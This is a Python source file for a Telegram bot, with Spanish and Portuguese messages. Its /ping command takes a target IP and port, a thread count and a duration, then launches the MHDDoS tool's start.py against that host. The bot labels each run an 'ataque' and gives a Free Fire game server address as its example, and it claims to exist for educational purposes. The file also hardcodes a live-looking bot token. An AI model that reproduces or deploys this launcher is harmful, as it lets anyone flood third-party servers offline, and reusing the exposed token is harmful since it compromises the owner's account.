import telebot
import subprocess
from threading import Lock
import time
import atexit
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
ADMIN_ID = 6348583777
GROUP_ID = -1002260050481  # Reemplaza con el ID real de tu grupo
GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

@atexit.register
def close_db_connection():
    pass  # No hay conexión de base de datos que cerrar

def is_allowed(message):
    """ Verifica si el mensaje proviene del grupo permitido o si es del admin en privado. """
    if message.chat.id == GROUP_ID or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
        return True
    bot.reply_to(message, "❌ Este bot solo funciona en un grupo en específico.\n🔗 Únete a este grupo para poder utilizar este bot: " + GROUP_LINK)
    return False

@bot.message_handler(commands=["start"])
def handle_start(message):
    if not is_allowed(message):
        return

    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 SOPORTE - OFICIAL 💻",
        url=f"tg://user?id={ADMIN_ID}"
    )
    markup.add(button)

    bot.send_message(
        message.chat.id,
        (
            "🤖 *Bienvenido al Bot de Ping MHDDoS [Free Fire]!*\n\n"
            "📌 *Como usar:*\n"
            "```/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n\n"
            "💡 *Ejemplo:*\n"
            "```/ping UDP 143.92.125.230:10013 3 120```\n\n"
            "⚠️ *Atención:* Este bot fue creado con fines educativos."
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["ping"])
def handle_ping(message):
    if not is_allowed(message):
        return

    telegram_id = message.from_user.id

    # Verificar cooldown
    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ Espere 20 segundos antes de usar este comando nuevamente.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!*\n\n"
                "📌 *Uso correto:*\n"
                "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "💡 *Ejemplo:*\n"
                "`/ping UDP 143.92.125.230:10013 3 120`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[telegram_id] = process
        cooldowns[telegram_id] = time.time()

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))

        bot.reply_to(
            message,
            (
                "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
                f"📍 *IP/Host:Porta:* {ip_port}\n"
                f"⚙️ *Tipo:* {attack_type}\n"
                f"🧵 *Threads:* {threads}\n"
                f"⏳ *Tempo (ms):* {duration}\n"
                f"💻 *Comando ejecutado:* `ping`\n\n"
                f"*⚠️ Atención! Este bot fue creado por*@xFernandoh"
            ),
            reply_markup=markup,
            parse_mode="Markdown",
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Solo el usuario que inició el ataque puede pararlo."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
        bot.edit_message_text(
            "*[⛔] ATAQUE PARADO [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")

if __name__ == "__main__":
    bot.infinity_polling()
